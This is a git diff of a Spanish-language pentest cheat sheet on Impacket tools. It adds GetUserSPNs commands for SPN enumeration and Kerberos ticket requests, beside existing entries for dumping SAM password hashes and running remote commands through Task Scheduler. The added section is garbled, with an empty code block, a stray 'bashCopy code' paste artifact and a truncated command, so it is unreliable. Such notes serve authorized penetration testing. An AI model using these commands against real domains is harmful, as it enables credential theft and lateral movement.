@@ -18,8 +18,18 @@ Descripción: Extrae contraseñas almacenadas en la SAM (Security Accounts Manag
 ```python
 impacket-secretsdump.py DOMAIN/USER:PASSWORD@TARGET_HOST
 ```
+### impacket-GetUserSPNs:
+Enumeración de SPNs: Utiliza `GetUserSPNs.py` para enumerar los SPNs asociados a un usuario específico o a todos los usuarios en un dominio.
+```python
 
-
+```
+`impacket-GetUserSPNs.py -request <USER>:<PASSWORD> -dc-ip <DOMAIN_CONTROLLER_IP> <DOMAIN>/<USER>`
+    
+2. Obtención del TGS: Una vez que hayas identificado el SPN deseado, puedes solicitar un TGS para ese SPN utilizando `GetUserSPNs.py`.
+    
+    bashCopy code
+    
+    `impacket-GetUserSPNs.py <USER>:<PASSWORD> -spn <SPN_TO_TARGET> -dc-ip <DOMAIN_CONTROL`
 ### impacket-atexec:
 Descripción: Permite ejecutar comandos en un sistema remoto utilizando el servicio Task Scheduler (programador de tareas).
 ```python
